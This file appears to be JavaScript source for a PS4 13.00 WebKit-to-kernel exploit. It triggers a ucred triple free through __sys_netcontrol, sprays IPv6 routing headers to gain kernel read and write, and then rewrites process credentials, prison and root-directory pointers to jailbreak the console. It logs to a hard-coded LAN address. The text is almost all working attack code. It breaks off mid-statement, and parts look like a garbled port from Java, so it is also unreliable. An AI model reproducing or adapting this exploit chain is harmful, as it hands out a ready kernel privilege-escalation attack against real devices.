function launchExploit() {
  (async () => {
    try {
      alert("Starting PS4 13.00 WebKit Exploit...");

      class ExploitNetControlImpl {
        constructor() {
          this.DUP_SYMBOL = "dup";
          this.CLOSE_SYMBOL = "close";
          this.READ_SYMBOL = "read";
          this.READV_SYMBOL = "readv";
          this.WRITE_SYMBOL = "write";
          this.WRITEV_SYMBOL = "writev";
          this.IOCTL_SYMBOL = "ioctl";
          this.PIPE_SYMBOL = "pipe";
          this.KQUEUE_SYMBOL = "kqueue";
          this.SOCKET_SYMBOL = "socket";
          this.SOCKETPAIR_SYMBOL = "socketpair";
          this.RECVMSG_SYMBOL = "recvmsg";
          this.GETSOCKOPT_SYMBOL = "getsockopt";
          this.SETSOCKOPT_SYMBOL = "setsockopt";
          this.SETUID_SYMBOL = "setuid";
          this.GETPID_SYMBOL = "getpid";
          this.SCHED_YIELD_SYMBOL = "sched_yield";
          this.CPUSET_SETAFFINITY_SYMBOL = "cpuset_setaffinity";
          this.RTPRIO_THREAD_SYMBOL = "rtprio_thread";
          this.SYS_NETCONTROL_SYMBOL = "__sys_netcontrol";

          this.KERNEL_PID = 0;

          this.SYSCORE_AUTHID = 0x4800000000000007n;
          this.FIOSETOWN = 0x8004667Cn;
          this.PAGE_SIZE = 0x4000;
          this.NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
          this.NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;

          this.AF_UNIX = 1;
          this.AF_INET6 = 28;
          this.SOCK_STREAM = 1;
          this.IPPROTO_IPV6 = 41;

          this.SO_SNDBUF = 0x1001;
          this.SOL_SOCKET = 0xffff;

          this.IPV6_RTHDR = 51;
          this.IPV6_RTHDR_TYPE_0 = 0;

          this.RTP_PRIO_REALTIME = 2;
          this.RTP_SET = 1;

          this.UIO_READ = 0;
          this.UIO_WRITE = 1;
          this.UIO_SYSSPACE = 1;

          this.CPU_LEVEL_WHICH = 3;
          this.CPU_WHICH_TID = 1;

          this.IOV_SIZE = 0x10;
          this.CPU_SET_SIZE = 0x10;
          this.PIPEBUF_SIZE = 0x18;
          this.MSG_HDR_SIZE = 0x30;
          this.FILEDESCENT_SIZE = 0x30;
          this.UCRED_SIZE = 0x168;

          this.RTHDR_TAG = 0x13370000n;

          this.UIO_IOV_NUM = 0x14;
          this.MSG_IOV_NUM = 0x17;

          this.IPV6_SOCK_NUM = 64;
          this.IOV_THREAD_NUM = 4;
          this.UIO_THREAD_NUM = 4;

          this.COMMAND_UIO_READ = 0;
          this.COMMAND_UIO_WRITE = 1;

          this.MAIN_CORE = 11;

          this.LOG_IP = "192.168.1.53";
          this.LOG_PORT = 1337;

          this.api = new API();
          this.kapi = new KernelAPI();

          this.out = null;

          this.dup = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.DUP_SYMBOL);
          this.close = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.CLOSE_SYMBOL);
          this.read = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.READ_SYMBOL);
          this.readv = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.READV_SYMBOL);
          this.write = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.WRITE_SYMBOL);
          this.writev = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.WRITEV_SYMBOL);
          this.ioctl = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.IOCTL_SYMBOL);
          this.pipe = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.PIPE_SYMBOL);
          this.kqueue = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.KQUEUE_SYMBOL);
          this.socket = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.SOCKET_SYMBOL);
          this.socketpair = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.SOCKETPAIR_SYMBOL);
          this.recvmsg = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.RECVMSG_SYMBOL);
          this.getsockopt = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.GETSOCKOPT_SYMBOL);
          this.setsockopt = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.SETSOCKOPT_SYMBOL);
          this.setuid = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.SETUID_SYMBOL);
          this.getpid = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.GETPID_SYMBOL);
          this.sched_yield = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.SCHED_YIELD_SYMBOL);
          this.cpuset_setaffinity = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.CPUSET_SETAFFINITY_SYMBOL);
          this.rtprio_thread = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.RTPRIO_THREAD_SYMBOL);
          this.__sys_netcontrol = this.api.dlsym(this.api.LIBKERNEL_MODULE_HANDLE, this.SYS_NETCONTROL_SYMBOL);

          this.twins = new Int32Array(2);
          this.triplets = new Int32Array(3);
          this.ipv6Socks = new Int32Array(this.IPV6_SOCK_NUM);

          this.sprayRthdr = new Buffer(this.UCRED_SIZE);
          this.sprayRthdrLen = 0;
          this.leakRthdr = new Buffer(this.UCRED_SIZE);
          this.leakRthdrLen = new Int32();

          this.msg = new Buffer(this.MSG_HDR_SIZE);
          this.msgIov = new Buffer(this.MSG_IOV_NUM * this.IOV_SIZE);
          this.uioIovRead = new Buffer(this.UIO_IOV_NUM * this.IOV_SIZE);
          this.uioIovWrite = new Buffer(this.UIO_IOV_NUM * this.IOV_SIZE);

          this.uioSs = new Int32Array(2);
          this.iovSs = new Int32Array(2);

          this.iovThreads = new Array(this.IOV_THREAD_NUM);
          this.uioThreads = new Array(this.UIO_THREAD_NUM);

          this.iovState = new WorkerState(this.IOV_THREAD_NUM);
          this.uioState = new WorkerState(this.UIO_THREAD_NUM);

          this.uafSock = 0;

          this.uioSs0 = 0;
          this.uioSs1 = 0;

          this.iovSs0 = 0;
          this.iovSs1 = 0;

          this.kq_fdp = 0n;
          this.fdt_ofiles = 0n;
          this.allproc = 0n;

          this.tmp = new Buffer(this.PAGE_SIZE);
        }

        log(msg) {
          this.out.write(msg + "\n");
          this.out.flush();
        }

        dup(fd) {
          return this.api.call(this.dup, fd);
        }

        close(fd) {
          return this.api.call(this.close, fd);
        }

        read(fd, buf, nbytes) {
          return this.api.call(this.read, fd, buf !== null ? buf.address() : 0, nbytes);
        }

        readv(fd, iov, iovcnt) {
          return this.api.call(this.readv, fd, iov !== null ? iov.address() : 0, iovcnt);
        }

        write(fd, buf, nbytes) {
          return this.api.call(this.write, fd, buf !== null ? buf.address() : 0, nbytes);
        }

        writev(fd, iov, iovcnt) {
          return this.api.call(this.writev, fd, iov !== null ? iov.address() : 0, iovcnt);
        }

        ioctl(fd, request, arg0) {
          return this.api.call(this.ioctl, fd, request, arg0);
        }

        pipe(fildes) {
          return this.api.call(this.pipe, fildes !== null ? fildes.address() : 0);
        }

        kqueue() {
          return this.api.call(this.kqueue);
        }

        socket(domain, type, protocol) {
          return this.api.call(this.socket, domain, type, protocol);
        }

        socketpair(domain, type, protocol, sv) {
          return this.api.call(this.socketpair, domain, type, protocol, sv !== null ? sv.address() : 0);
        }

        recvmsg(s, msg, flags) {
          return this.api.call(this.recvmsg, s, msg !== null ? msg.address() : 0, flags);
        }

        getsockopt(s, level, optname, optval, optlen) {
          return this.api.call(
            this.getsockopt,
            s,
            level,
            optname,
            optval !== null ? optval.address() : 0,
            optlen !== null ? optlen.address() : 0
          );
        }

        setsockopt(s, level, optname, optval, optlen) {
          return this.api.call(
            this.setsockopt,
            s,
            level,
            optname,
            optval !== null ? optval.address() : 0,
            optlen
          );
        }

        setuid(uid) {
          return this.api.call(this.setuid, uid);
        }

        getpid() {
          return this.api.call(this.getpid);
        }

        sched_yield() {
          return this.api.call(this.sched_yield);
        }

        cpuset_setaffinity(level, which, id, setsize, mask) {
          return this.api.call(
            this.cpuset_setaffinity,
            level,
            which,
            id,
            setsize,
            mask !== null ? mask.address() : 0
          );
        }

        rtprio_thread(function, lwpid, rtp) {
          return this.api.call(this.rtprio_thread, function, lwpid, rtp);
        }

        __sys_netcontrol(ifindex, cmd, buf, size) {
          return this.api.call(
            this.__sys_netcontrol,
            ifindex,
            cmd,
            buf !== null ? buf.address() : 0,
            size
          );
        }

        buildRthdr(buf, size) {
          let len = ((size >> 3) - 1) & ~1;
          buf.putByte(0x00, 0); // ip6r_nxt
          buf.putByte(0x01, len); // ip6r_len
          buf.putByte(0x02, this.IPV6_RTHDR_TYPE_0); // ip6r_type
          buf.putByte(0x03, len >> 1); // ip6r_segleft
          return (len + 1) << 3;
        }

        getRthdr(s, buf, len) {
          return this.getsockopt(s, this.IPPROTO_IPV6, this.IPV6_RTHDR, buf, len);
        }

        setRthdr(s, buf, len) {
          return this.setsockopt(s, this.IPPROTO_IPV6, this.IPV6_RTHDR, buf, len);
        }

        freeRthdr(s) {
          return this.setsockopt(s, this.IPPROTO_IPV6, this.IPV6_RTHDR, null, 0);
        }

        cpusetSetAffinity(core) {
          let mask = new Buffer(this.CPU_SET_SIZE);
          mask.putShort(0x00, 1 << core);
          return this.cpuset_setaffinity(
            this.CPU_LEVEL_WHICH,
            this.CPU_WHICH_TID,
            0xffffffffffffffffn,
            this.CPU_SET_SIZE,
            mask
          );
        }

        rtprioThread(value) {
          let prio = new Buffer(0x4);
          prio.putShort(0x00, this.RTP_PRIO_REALTIME);
          prio.putShort(0x02, value);
          return this.rtprio_thread(this.RTP_SET, 0, prio.address());
        }

        findTwins() {
          while (true) {
            for (let i = 0; i < this.ipv6Socks.length; i++) {
              this.sprayRthdr.putInt(0x04, this.RTHDR_TAG | i);
              this.setRthdr(this.ipv6Socks[i], this.sprayRthdr, this.sprayRthdrLen);
            }

            for (let i = 0; i < this.ipv6Socks.length; i++) {
              this.leakRthdrLen.set(8n);
              this.getRthdr(this.ipv6Socks[i], this.leakRthdr, this.leakRthdrLen);
              let val = this.leakRthdr.getInt(0x04);
              let j = val & 0xffff;
              if ((val & 0xffff0000) === this.RTHDR_TAG && i !== j) {
                this.twins[0] = i;
                this.twins[1] = j;
                return;
              }
            }
          }
        }

        findTriplet(master, other) {
          while (true) {
            for (let i = 0; i < this.ipv6Socks.length; i++) {
              if (i === master || i === other) {
                continue;
              }

              this.sprayRthdr.putInt(0x04, this.RTHDR_TAG | i);
              this.setRthdr(this.ipv6Socks[i], this.sprayRthdr, this.sprayRthdrLen);
            }

            for (let i = 0; i < this.ipv6Socks.length; i++) {
              if (i === master || i === other) {
                continue;
              }

              this.leakRthdrLen.set(8n);
              this.getRthdr(this.ipv6Socks[master], this.leakRthdr, this.leakRthdrLen);
              let val = this.leakRthdr.getInt(0x04);
              let j = val & 0xffff;
              if ((val & 0xffff0000) === this.RTHDR_TAG && j !== master && j !== other) {
                return j;
              }
            }
          }
        }

        triggerUcredTripleFree() {
          let setBuf = new Buffer(8);
          let clearBuf = new Buffer(8);

          // Prepare msg iov spray. Set 1 as iov_base as it will be interpreted as cr_refcnt.
          this.msgIov.putLong(0x00, 1n); // iov_base
          this.msgIov.putLong(0x08, 1n); // iov_len

          // Create dummy socket to be registered and then closed.
          let dummySock = this.socket(this.AF_UNIX, this.SOCK_STREAM, 0);

          // Register dummy socket.
          setBuf.putInt(0x00, dummySock);
          this.__sys_netcontrol(-1, this.NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size());

          // Close the dummy socket.
          this.close(dummySock);

          // Allocate a new ucred.
          this.setuid(1);

          // Reclaim the file descriptor.
          this.uafSock = this.socket(this.AF_UNIX, this.SOCK_STREAM, 0);

          // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
          this.setuid(1);

          // Unregister dummy socket and free the file and ucred.
          clearBuf.putInt(0x00, this.uafSock);
          this.__sys_netcontrol(-1, this.NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());

          // Set cr_refcnt back to 1.
          for (let i = 0; i < 32; i++) {
            // Reclaim with iov.
            this.iovState.signalWork(0);
            this.sched_yield();

            // Release buffers.
            this.write(this.iovSs1, this.tmp, 1n);
            this.iovState.waitForFinished();
            this.read(this.iovSs0, this.tmp, 1n);
          }

          // Double free ucred.
          // Note: Only dup works because it does not check f_hold.
          this.close(this.dup(this.uafSock));

          // Find twins.
          this.findTwins();

          this.log("[*] Triple freeing...");

          // Free one.
          this.freeRthdr(this.ipv6Socks[this.twins[1]]);

          // Set cr_refcnt back to 1.
          while (true) {
            // Reclaim with iov.
            this.iovState.signalWork(0);
            this.sched_yield();

            this.leakRthdrLen.set(8n);
            this.getRthdr(this.ipv6Socks[this.twins[0]], this.leakRthdr, this.leakRthdrLen);

            if (this.leakRthdr.getInt(0x00) === 1) {
              break;
            }

            // Release iov spray.
            this.write(this.iovSs1, this.tmp, 1n);
            this.iovState.waitForFinished();
            this.read(this.iovSs0, this.tmp, 1n);
          }

          this.triplets[0] = this.twins[0];

          // Triple free ucred.
          this.close(this.dup(this.uafSock));

          // Find triplet.
          this.triplets[1] = this.findTriplet(this.triplets[0], -1);

          // Release iov spray.
          this.write(this.iovSs1, this.tmp, 1n);

          // Find triplet.
          this.triplets[2] = this.findTriplet(this.triplets[0], this.triplets[1]);

          this.iovState.waitForFinished();
          this.read(this.iovSs0, this.tmp, 1n);
        }

        leakKqueue() {
          this.log("[*] Leaking kqueue...");

          // Free one.
          this.freeRthdr(this.ipv6Socks[this.triplets[1]]);

          // Leak kqueue.
          let kq = 0;
          while (true) {
            kq = this.kqueue();

            // Leak with other rthdr.
            this.leakRthdrLen.set(0x100);
            this.getRthdr(this.ipv6Socks[this.triplets[0]], this.leakRthdr, this.leakRthdrLen);

            if (this.leakRthdr.getLong(0x08) === 0x1430000n) {
              break;
            }

            this.close(kq);
          }

          this.kq_fdp = this.leakRthdr.getLong(0xa8);
          this.log("[+] kq_fdp: " + this.kq_fdp.toString(16));

          // Close kqueue to free buffer.
          this.close(kq);

          // Find triplet.
          this.triplets[1] = this.findTriplet(this.triplets[0], this.triplets[2]);
        }

        buildUio(uio, uio_iov, uio_td, read, addr, size) {
          uio.putLong(0x00, uio_iov); // uio_iov
          uio.putLong(0x08, this.UIO_IOV_NUM); // uio_iovcnt
          uio.putLong(0x10, 0xffffffffffffffffn); // uio_offset
          uio.putLong(0x18, size); // uio_resid
          uio.putInt(0x20, this.UIO_SYSSPACE); // uio_segflg
          uio.putInt(0x24, read ? this.UIO_WRITE : this.UIO_READ); // uio_segflg
          uio.putLong(0x28, uio_td); // uio_td
          uio.putLong(0x30, addr); // iov_base
          uio.putLong(0x38, size); // iov_len
        }

        kreadSlow(addr, size) {
          // Prepare leak buffers.
          let leakBuffers = new Array(this.UIO_THREAD_NUM);
          for (let i = 0; i < this.UIO_THREAD_NUM; i++) {
            leakBuffers[i] = new Buffer(size);
          }

          // Set send buf size.
          let bufSize = new Int32(size);
          this.setsockopt(this.uioSs1, this.SOL_SOCKET, this.SO_SNDBUF, bufSize, bufSize.size());

          // Fill queue.
          this.write(this.uioSs1, this.tmp, size);

          // Set iov length
          this.uioIovRead.putLong(0x08, size);

          // Free one.
          this.freeRthdr(this.ipv6Socks[this.triplets[1]]);

          // Reclaim with uio.
          while (true) {
            this.uioState.signalWork(this.COMMAND_UIO_READ);
            this.sched_yield();

            // Leak with other rthdr.
            this.leakRthdrLen.set(0x10);
            this.getRthdr(this.ipv6Socks[this.triplets[0]], this.leakRthdr, this.leakRthdrLen);

            if (this.leakRthdr.getInt(0x08) === this.UIO_IOV_NUM) {
              break;
            }

            // Wake up all threads.
            this.read(this.uioSs0, this.tmp, size);

            for (let i = 0; i < this.UIO_THREAD_NUM; i++) {
              this.read(this.uioSs0, leakBuffers[i], leakBuffers[i].size());
            }

            this.uioState.waitForFinished();

            // Fill queue.
            this.write(this.uioSs1, this.tmp, size);
          }

          let uio_iov = this.leakRthdr.getLong(0x00);

          // Prepare uio reclaim buffer.
          this.buildUio(this.msgIov, uio_iov, 0, true, addr, size);

          // Free second one.
          this.freeRthdr(this.ipv6Socks[this.triplets[2]]);

          // Reclaim uio with iov.
          while (true) {
            // Reclaim with iov.
            this.iovState.signalWork(0);
            this.sched_yield();

            // Leak with other rthdr.
            this.leakRthdrLen.set(0x40);
            this.getRthdr(this.ipv6Socks[this.triplets[0]], this.leakRthdr, this.leakRthdrLen);

            if (this.leakRthdr.getInt(0x20) === this.UIO_SYSSPACE) {
              break;
            }

            // Release iov spray.
            this.write(this.iovSs1, this.tmp, 1n);
            this.iovState.waitForFinished();
            this.read(this.iovSs0, this.tmp, 1n);
          }

          // Wake up all threads.
          this.read(this.uioSs0, this.tmp, size);

          // Read the results now.
          let leakBuffer = null;

          // Get leak.
          for (let i = 0; i < this.UIO_THREAD_NUM; i++) {
            this.read(this.uioSs0, leakBuffers[i], leakBuffers[i].size());

            if (leakBuffers[i].getLong(0x00) !== 0x4141414141414141n) {
              // Find triplet.
              this.triplets[1] = this.findTriplet(this.triplets[0], -1);

              leakBuffer = leakBuffers[i];
            }
          }

          this.uioState.waitForFinished();

          // Release iov spray.
          this.write(this.iovSs1, this.tmp, 1n);

          // Find triplet.
          this.triplets[2] = this.findTriplet(this.triplets[0], this.triplets[1]);

          this.iovState.waitForFinished();
          this.read(this.iovSs0, this.tmp, 1n);

          return leakBuffer;
        }

        kwriteSlow(addr, buffer) {
          // Set send buf size.
          let bufSize = new Int32(buffer.size());
          this.setsockopt(this.uioSs1, this.SOL_SOCKET, this.SO_SNDBUF, bufSize, bufSize.size());

          // Set iov length.
          this.uioIovWrite.putLong(0x08, buffer.size());

          // Free first triplet.
          this.freeRthdr(this.ipv6Socks[this.triplets[1]]);

          // Reclaim with uio.
          while (true) {
            this.uioState.signalWork(this.COMMAND_UIO_WRITE);
            this.sched_yield();

            // Leak with other rthdr.
            this.leakRthdrLen.set(0x10);
            this.getRthdr(this.ipv6Socks[this.triplets[0]], this.leakRthdr, this.leakRthdrLen);

            if (this.leakRthdr.getInt(0x08) === this.UIO_IOV_NUM) {
              break;
            }

            // Wake up all threads.
            for (let i = 0; i < this.UIO_THREAD_NUM; i++) {
              this.write(this.uioSs1, buffer, buffer.size());
            }

            this.uioState.waitForFinished();
          }

          let uio_iov = this.leakRthdr.getLong(0x00);

          // Prepare uio reclaim buffer.
          this.buildUio(this.msgIov, uio_iov, 0, false, addr, buffer.size());

          // Free second one.
          this.freeRthdr(this.ipv6Socks[this.triplets[2]]);

          // Reclaim uio with iov.
          while (true) {
            // Reclaim with iov.
            this.iovState.signalWork(0);
            this.sched_yield();

            // Leak with other rthdr.
            this.leakRthdrLen.set(0x40);
            this.getRthdr(this.ipv6Socks[this.triplets[0]], this.leakRthdr, this.leakRthdrLen);

            if (this.leakRthdr.getInt(0x20) === this.UIO_SYSSPACE) {
              break;
            }

            // Release iov spray.
            this.write(this.iovSs1, this.tmp, 1n);
            this.iovState.waitForFinished();
            this.read(this.iovSs0, this.tmp, 1n);
          }

          // Corrupt data.
          for (let i = 0; i < this.UIO_THREAD_NUM; i++) {
            this.write(this.uioSs1, buffer, buffer.size());
          }

          // Find triplet.
          this.triplets[1] = this.findTriplet(this.triplets[0], -1);

          this.uioState.waitForFinished();

          // Release iov spray.
          this.write(this.iovSs1, this.tmp, 1n);

          // Find triplet.
          this.triplets[2] = this.findTriplet(this.triplets[0], this.triplets[1]);

          this.iovState.waitForFinished();
          this.read(this.iovSs0, this.tmp, 1n);
        }

        kreadSlow64(address) {
          return this.kreadSlow(address, 8).getLong(0x00);
        }

        fget(fd) {
          return this.kapi.kread64(this.fdt_ofiles + fd * this.FILEDESCENT_SIZE);
        }

        findAllProc() {
          let pipeFd = new Int32Array(2);
          this.pipe(pipeFd);

          let currPid = new Int32();
          currPid.set(this.getpid());
          this.ioctl(pipeFd[0], this.FIOSETOWN, currPid.address());

          let fp = this.fget(pipeFd[0]);
          let f_data = this.kapi.kread64(fp + 0x00);
          let pipe_sigio = this.kapi.kread64(f_data + 0xd8);
          let p = this.kapi.kread64(pipe_sigio);

          while ((p & 0xffffffff00000000n) !== 0xffffffff00000000n) {
            p = this.kapi.kread64(p + 0x08); // p_list.le_prev
          }

          this.close(pipeFd[1]);
          this.close(pipeFd[0]);

          return p;
        }

        pfind(pid) {
          let p = this.kapi.kread64(this.allproc);
          while (p !== 0) {
            if (this.kapi.kread32(p + 0xbc) === pid) {
              break;
            }
            p = this.kapi.kread64(p + 0x00); // p_list.le_next
          }

          return p;
        }

        fhold(fp) {
          this.kapi.kwrite32(fp + 0x28, this.kapi.kread32(fp + 0x28) + 1); // f_count
        }

        removeRthrFromSocket(fd) {
          let fp = this.fget(fd);
          let f_data = this.kapi.kread64(fp + 0x00);
          let so_pcb = this.kapi.kread64(f_data + 0x18);
          let in6p_outputopts = this.kapi.kread64(so_pcb + 0x120);
          this.kapi.kwrite64(in6p_outputopts + 0x70, 0); // ip6po_rhi_rthdr
        }

        removeUafFile() {
          let uafFile = this.fget(this.uafSock);
          this.log("[+] uafFile: " + uafFile.toString(16));

          // Remove uaf sock.
          this.kapi.kwrite64(this.fdt_ofiles + this.uafSock * this.FILEDESCENT_SIZE, 0);

          // Remove triple freed file from uaf sock.
          let removed = 0;
          let ss = new Int32Array(2);
          for (let i = 0; i < 0x1000; i++) {
            let s = this.socket(this.AF_UNIX, this.SOCK_STREAM, 0);
            if (this.fget(s) === uafFile) {
              this.kapi.kwrite64(this.fdt_ofiles + s * this.FILEDESCENT_SIZE, 0);
              removed++;
            }
            this.close(s);

            if (removed === 3) {
              this.log("[+] Cleaned up uafFile after iterations: " + i);
              break;
            }
          }
        }

        getRootVnode() {
          let p = this.pfind(this.KERNEL_PID);
          let p_fd = this.kapi.kread64(p + 0x48);
          let rootvnode = this.kapi.kread64(p_fd + 0x08);
          return rootvnode;
        }

        getPrison0() {
          let p = this.pfind(this.KERNEL_PID);
          let p_ucred = this.kapi.kread64(p + 0x40);
          let prison0 = this.kapi.kread64(p_ucred + 0x30);
          return prison0;
        }

        jailbreak() {
          let p = this.pfind(this.getpid());

          // Patch credentials and capabilities.
          let prison0 = this.getPrison0();
          let p_ucred = this.kapi.kread64(p + 0x40);
          this.kapi.kwrite32(p_ucred + 0x04, 0); // cr_uid
          this.kapi.kwrite32(p_ucred + 0x08, 0); // cr_ruid
          this.kapi.kwrite32(p_ucred + 0x0c, 0); // cr_svuid
          this.kapi.kwrite32(p_ucred + 0x10, 1); // cr_ngroups
          this.kapi.kwrite32(p_ucred + 0x14, 0); // cr_rgid
          this.kapi.kwrite32(p_ucred + 0x18, 0); // cr_svgid
          this.kapi.kwrite64(p_ucred + 0x30, prison0); // cr_prison
          this.kapi.kwrite64(p_ucred + 0x58, this.SYSCORE_AUTHID); // cr_sceAuthId
          this.kapi.kwrite64(p_ucred + 0x60, 0xffffffffffffffffn); // cr_sceCaps[0]
          this.kapi.kwrite64(p_ucred + 0x68, 0xffffffffffffffffn); // cr_sceCaps[1]
          this.kapi.kwrite8(p_ucred + 0x83, 0x80); // cr_sceAttr[0]

          // Allow root file system access.
          let rootvnode = this.getRootVnode();
          let p_fd = this.kapi.kread64(p + 0x48);
          this.kapi.kwrite64(p_fd + 0x08, rootvnode); // fd_cdir
          this.kapi.kwrite64(p_fd + 0x10, rootvnode); // fd_rdir
          this.kapi.kwrite64(p_fd + 0x18, 0); // fd_jdir

          // Allow syscall from everywhere.
          let p_dynlib = this.kapi.kread64(p + 0x3e8);
          this.kapi.kwrite64(p_dynlib + 0xf0, 0); // start
          this.kapi.kwrite64(p_dynlib + 0xf8, 0xffffffffffffffffn); // end

          // Allow dlsym.
          let dynlib_eboot = this.kapi.kread64(p_dynlib + 0x00);
          let eboot_segments = this.kapi.kread64(dynlib_eboot + 0x40);
          this.kapi.kwrite64(eboot_segments + 0x08, 0); // addr
          this.kapi.kwrite64(eboot_segments + 0x10, 0xffffffffffffffffn); // size
        }

        setup() {
          // Create socket pair for uio spraying.
          this.socketpair(this.AF_UNIX, this.SOCK_STREAM, 0, this.uioSs);
          this.uioSs0 = this.uioSs[0];
          this.uioSs1 = this.uioSs[1];

          // Create socket pair for iov spraying.
          this.socketpair(this.AF_UNIX, this.SOCK_STREAM, 0, this.iovSs);
          this.iovSs0 = this.iovSs[0];
          this.iovSs1 = this.iovSs[1];

          // Create iov threads.
          for (let i = 0; i < this.IOV_THREAD_NUM; i++) {
            this.iovThreads[i] = new IovThread(this.iovState);
            this.iovThreads[i].start();
          }

          // Create uio threads.
          for (let i = 0; i < this.UIO_THREAD_NUM; i++) {
            this.uioThreads[i] = new UioThread(this.uioState);
            this.uioThreads[i].start();
          }

          // Set up sockets for spraying.
          for (let i = 0; i < this.ipv6Socks.length; i++) {
            this.ipv6Socks[i] = this.socket(this.AF_INET6, this.SOCK_STREAM, 0);
          }

          // Initialize pktopts.
          for (let i = 0; i < this.ipv6Socks.length; i++) {
            this.freeRthdr(this.ipv6Socks[i]);
          }
        }

        cleanup() {
          // Close all files.
          for (let i = 0; i < this.ipv6Socks.length; i++) {
            this.close(this.ipv6Socks[i]);
          }

          this.close(this.uioSs1);
          this.close(this.uioSs0);
          this.close(this.iovSs1);
          this.close(this.iovSs0);

          // Stop uio threads.
          for (let i = 0; i < this.UIO_THREAD_NUM; i++) {
            this.uioThreads[i].interrupt();
            this.uioThreads[i].join();
          }

          // Stop iov threads.
          for (let i = 0; i < this.IOV_THREAD_NUM; i++) {
            this.iovThreads[i].interrupt();
            this.iovThreads[i].join();
          }
        }

        trigger() {
          let s = new Socket(this.LOG_IP, this.LOG_PORT);
          this.out = new PrintWriter(s.getOutputStream(), true);

          this.cpusetSetAffinity(this.MAIN_CORE);
          this.rtprioThread(256);

          this.setup();

          // Trigger vulnerability.
          this.triggerUcredTripleFree();

          // Leak pointers from kqueue.
          this.leakKqueue();

          // Leak fd_files from kq_fdp.
          let fd_files = this.kreadSlow64(this.kq_fdp);
          this.fdt_ofiles = fd_files + 0x08;
          this.log("[+] fdt_ofiles: " + this.fdt_ofiles.toString(16));

          let masterRpipeFile =
            this.kreadSlow64(this.fdt_ofiles + this.kapi.getMasterPipeFd()[0] * this.FILEDESCENT_SIZE);
          this.log("[+] masterRpipeFile: " + masterRpipeFile.toString(16));

          let victimRpipeFile =
            this.kreadSlow64(this.fdt_ofiles + this.kapi.getVictimPipeFd()[0] * this.FILEDESCENT_SIZE);
          this.log("[+] victimRpipeFile: " + victimRpipeFile.toString(16));

          let masterRpipeData = this.kreadSlow64(masterRpipe

